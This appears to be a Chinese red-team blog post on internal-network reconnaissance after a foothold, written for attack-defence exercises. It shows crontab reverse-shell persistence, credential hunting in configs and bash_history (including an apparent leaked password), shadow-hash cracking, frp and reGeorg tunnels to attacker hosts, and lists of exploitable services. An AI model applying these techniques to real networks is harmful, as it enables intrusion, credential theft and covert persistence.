---
layout: post
toc: true
title: "「信息搜集」:漫谈一些在内网的信息搜集技巧"
author: Bin4xin
wrench: 2021-03-19
categories:
    - blog
    - vulnhub
    - 内网
    - 信息搜集
permalink: /blog/2020/walkthrough/insideNet/
---

经历过几次HW行动，每次HW都运气较好可以拿到服务器，于是每次公司的内网渗透的任务就交给我，记录一下对于内网的信息搜集过程，以及在此过程中我自己所积累的小技巧。

---
**2021年 3月19日 星期五 16时37分27秒 CST**更新
- 重构了部分小结的展示：
    * 重新调整了文章的阐述框架，尽可能从实战角度出发，进行章节安排；
    * 尽量使得前后小结更加紧凑，阐述逻辑更加清晰。

- 加入了尽可能多的markdown语法，文章结构清晰的同时，让页面更加赏心悦目。

> 写在文前：
> 
> 年后回来就一直在肝代码，肝的快失去信心了；正好三月中旬有场全国范围的攻防演练，就来重新拾起信心～演练结束再肝代码再失去信心，循环往复=。=
> 
> 本文着重从实战角度作为切入点，从获取的跳板机为入口进行阐述，基本的逻辑为：
>
> 跳板机->内网代理->信息搜集->漏洞挖掘与利用

我们从攻击者的角度来看，拿到一个跳板机的权限后首先是对跳板机所在的区域进行路由划分，我们可以通过这样的思路来判断获得内网中搜集到的信息是否利于我们进一步渗透，同时我们在此过程中也需要小心谨慎，攻防演练中我所遇到的基本上都是生产环境，在和开发、运维人员博弈的过程中要做到：
**悄悄地来、悄悄的走**

废话不多说，文笔较菜，文章权当抛砖引玉，回到正题。
## 零：在机器上的信息搜集

> 渗透的本质就是信息搜集  

### 0x01：个人工作机器信息搜集
这方面我本人了解的不是很多，一般来说是通过钓鱼邮件的形式获取的WINDOWS PC权限，可以参考我另一篇从网上的搬运过来的文章：

- [个人机器信息收集](https://juejin.cn/post/6881208971915444231#heading-3)

### 0x02：WEB服务器信息搜集
一般建议可以以root用户新建用户来维持权限，或者是写入`corntab`计划来定时反弹shell。实操中几乎很少有运维、开发去检查定时计划的反弹shell脚本，所以基本上可以满足后持续渗透的条件。
#### # 配置文件

- 数据库配置信息
通过mybatis等配置文件就可以拿到内网中对应的数据库机器，一般都是低权限，运气好可以拿到高权限。运气再好一点存在高权限的mssql数据库可以尝试连接一下尝试`xp_cmd_shell`来执行命令。

我们通过web层面拿到的机器，一般都是web服务器，即存在各种jar包，所以服务器里会存放大量配置文件
```bash
在当前目录下搜索存在字符为'mysql'的文件
grep -rn "mysql" .
=======
查看对应系统的敏感配置文件
cat static/scripts/tinymce/js/tinymce/plugins/jbimages/ci/application/config/database.php
=======
curl ifconfig.me
120.25.13.49
```
通过进程任务可以查找到部署jar包的目录和相对应依赖，大部分运维和开发都习惯于在根目录下新建data目录或者是非系统文件夹下的目录存在web的依赖jar包，我们就可以从这点做突破口。查看一下端口开放情况和对应的目录位置，有一些shell的基础就可以搜集到这些信息。
```bash
ps -ef|grep java

netstat -ANTUP
```


> **有的时候拿到的机器或多或少存在一些特殊情况，比如docker机器、单纯的一个数据库机器，那么就尽力而为去做一些搜集工作，特别是docker机器，除了跑的服务，机器里面太干净了，基本没有什么可以利用的地方。**

#### # bash_history

命令执行历史文件一般建议必看，里面会存着一些意想不到的内容，下面截取一小部分我在内网实战中发现的惊喜：

```bash
cd nexus-3.12.0-01
ll
cd bin/
./nexus start
pactera@575
cd domain/
ll
cd nexus3/
```
注意`./nexus start`和`cd domain/`两条命令中间的那个“命令”，对，没错那个是sudoer用户的密码，su切换直接就拥有root权限。我们分析一下为什么出现这样的现象：个人认为是在运行nexus程序是需要密码来提升权限，然后输入者在等待过程中没有发现输入密码的shell还没有回显出来就输入了密码，从而导致密码被系统当作执行命令记录进了history文件。

---
**发现这个后，我第一时间去看了自己服务器和自己的mac本上的历史文件，搜索机器密码关键词，同时也存在这样的现象明文密码存在了里面**


**醍醐灌顶**
#### # 一些自动化搜集脚本

- LinEnum.sh
```bash
curl -o /tmp/linenum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +X /tmp/linenum.sh && bash /tmp/linenum.sh
```

#### # Passwd&Shadow（不推荐）

一般来说通过`shiro`和`struts2`拿到的shell基本都是root，很多人都会直接去读取passwd文件，其实并不可取。下面展示一下2核4G服务器跑hash文件的过程。一般是跑不出来的，哈希不可逆，除非存在彩虹表，一般都跑不出来。 
```bash
hashcat -m 1800 -a 0 -o found.txt linux-root.txt /usr/share/john/password.lst --force
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz, 256/738 MB allocatable, 1MCU

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Uses-64-Bit

Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
* Device #1: Kernel m01800.8f866878.kernel not found in cache! Building may take a while...

```
继续 :(
```bash
[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => Dictionary cache built:
* Filename..: /usr/share/john/password.lst
* Passwords.: 3559
* Bytes.....: 26325
* Keyspace..: 3559
* Runtime...: 0 secs

- Device #1: autotuned kernel-accel to 128
- Device #1: autotuned kernel-loops to 128
[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => [s]tatus [p]ause [r]esume [b]ypass [c]heckpoApproaching final keyspace - workload adjusted.

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: linux-root.txt
Time.Started.....: Mon Jun  8 11:29:25 2020 (23 secs)
Time.Estimated...: Mon Jun  8 11:29:48 2020 (0 secs)
Guess.Base.......: File (/usr/share/john/password.lst)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      311 H/s (8.82ms)
Recovered........: 0/2 (0.00%) Digests, 0/2 (0.00%) Salts
Progress.........: 7118/7118 (100.00%)
Rejected.........: 0/7118 (0.00%)
Restore.Point....: 3559/3559 (100.00%)
Candidates.#1....: doom2 -> sss
HWMon.Dev.#1.....: N/A

Started: Mon Jun  8 11:28:50 2020
Stopped: Mon Jun  8 11:29:49 2020
```


### 0x03：运维机器信息搜集

头脑风暴中...（没有遇到，有再更新）
- 密码复用
- 常见运维平台及服务的漏洞利用
    - zabbix agent
    - 堡垒机
    - ...


## 一：局域网里的信息搜集


### 1x01：跳板机攻击
这一小节提出的意思是：跳板机上的`公网暴露`和`内网暴露`。
如：
- 各种数据库 mysql、oracle、postgresql仅内网开放
- 区别在于：`bind addr` = `0.0.0.0 or 127.0.0.1`

```bash
Nmap scan report for (inside_ip_addr)

20893/tcp open  textui       Alibaba Dubbo remoting telnetd
```
显而易见，内网里的Dubbo，反序列化走一波。

### 1x02：内网代理

内网代理，顾名思义就是我们自己可控的本机，通过各种代理方法（s5、s4），把拿下的内网服务器当作流量转发的一个中间跳板，对内网进行一系列我们想做的事情。这种情况下，我们的代理机器在内网没有具体的一个身份，只是我们通过代理的方式把我们对内网所发出的流量通过内网可控服务器向内网进行请求。

极力推荐。挂了代理就已经进入了内网，十分方便。只需要配置vps（frps）端，拿下shell后下载frpc客户端，启动服务就可以。下面顺便贴上server端和client端的配置文件:

- **frp server:**

```bash
$ cat frp/frps.ini 
[common]
# vps代理TCP监听端口
bind_port = 7000

# 授权码，请改成更复杂的
token = {your token}

# frp管理后台端口，请按自己需求更改
dashboard_port = 7500
# frp管理后台用户名和密码，请改成自己的
dashboard_user = {your admin username}
dashboard_pwd = {your admin password}
enable_prometheus = true

# frp日志配置
log_file = /var/log/frps.log
log_level = info
log_max_days = 3

#启动vps frps端
$ ./frps -c frps.ini
```
- **frp clients（被代理客户端，可以称为跳板机）:**

```bash
$ cat s5_jsccs.ini 
[common]
server_addr = {your vps ip}
server_port = 7000
token= {your token}

#此处可以自定义标签-dashboard面板proxies父栏对应的name={target}，{target}示例：s5_in_JStelecom
[{target}]
type = tcp
remote_port = 10010
plugin = socks5
plugin_user = {your connect username}
plugin_passwd = {your connect password}
use_encryption = true
use_compression = true
```

- **client（代理进内网客户端，可以称为攻击机器）**
    * 1.proxifier（支持mac、windows）配置自定义：
        * server_addr = {your vps ip}
        * server_port = 7000
        * plugin = socks5
        * plugin_user = {your connect username}
        * plugin_passwd = {your connect password}
    * 2.proxychains4 (linux、mac)配置`/etc/proxychains.conf`文件：
		```bash
		[ProxyList]
		# add proxy here ...
		# meanwile
		# defaults set to "tor"
		# socks4        127.0.0.1 9050

		#socks5 127.0.0.1 1081
		socks5  {your vps ip}   {your vps port}    {your connect username}   {your connect password}
		# burp suite proxy
		#http 127.0.0.1 12344
		```

应用即可。`proxychains4 curl http://{target.ip}:{target.port}/`命令进行内网访问，一般可以通过命令行进行海德拉批量口令爆破，若需GUI进行浏览器访问可使用`proxifier`进行全局代理进行web访问。


### 1x03：内网穿透

在写之前我们需要明确一点，就是我们所需要的内网目标是什么？
而内网穿透和内网代理的分别在哪里？
在什么情况我们需要做内网穿透，什么时候我们需要做内网代理？

```bash
python3 reGeorgSocksProxy.py -p 9999 -l 0.0.0.0 -u https://www.pgyer.com/tunnel.nosocket.php
```

内网穿透就是针对一个机器下的某一个特定端口，通过流量转发的形式把端口暴露在公网上，举个例子，我们拿下了一个linux机器，很巧这个机器是运维机器，我们发现了大量的运维账号密码。
又然后，发现windows的远程登录服务即3389端口，所以我们在这个时候可以使用端口服务转发的技巧，把端口流量转发到一个我们可控公网的端口上（如33890），那么我们在对我们自己可控公网的端口上进行数据请求的时候，就是在对这个windows机器的数据请求，所以我们可以很轻松的使用我们的到的账号和密码来连接对应的windows机器。

所以我们做内网穿透的最终目的，很显然是：
我们在已知某个内网服务器的敏感信息（如3389远程连接账号密码、3306连接账号密码），而我们在内网又无法使用windows机器远程连接、mysql-client软件对我们所得到的信息进行明确验证时，那么这个时候我们可以使用内网穿透即流量转发的手段来进行进一步验证。

### 1x04：内网信息搜集技巧
#### # nmap
由此拿到web服务器的权限后，msf死活都连不上，就无法进行内网扫描，查资料后可以：

- 跳板机（非root权限）本地编译安装nmap：

```bash
wget https://nmap.org/dist/nmap-7.40.tar.bz2
bzip2 -cd nmap-7.40.tar.bz2 | tar xvf -
cd nmap-7.40
./configure
echo $?
make && make install
noohup ./nmap -p- -T4 -A 192.168.0.0/24 &
```

- Cobalt Strike 插件扫描

## 二：典型案例剖析

- Elastic Search
    - RCE
    - 敏感信息
    - nday...
- Zabbix
    - 弱口令
    - SQL注入
    - nday...
- ActiveMQ
    - basic认证弱口令
    - ActiveMQ 反序列化漏洞（CVE-2015-5254）
    - PUT & MOVE方法写入shell
- Hystrix
    - ssrf
        - http://ip:6855/proxy.stream?origin=http://www.baidu.com
- redis
    - 未授权写入crontab计划
- shiro
    - shiro550 & 721 rememberMe反序列化
- struts2
    - s2-{01-61}
- ...
其实总结下来内网里有很多可以利用的，还是要具体问题具体分析才能更好的在内网“遨游”。

## 总结

**总结下来，内网的信息收集需要的是细心。**

## 参考

- [如何在目标内网中发现更多存活主机 [Arp,icmp,tcp/udp,smb,snmp ...]](https://apt404.github.io/2016/06/26/atived-machine-discovnery/)

以上。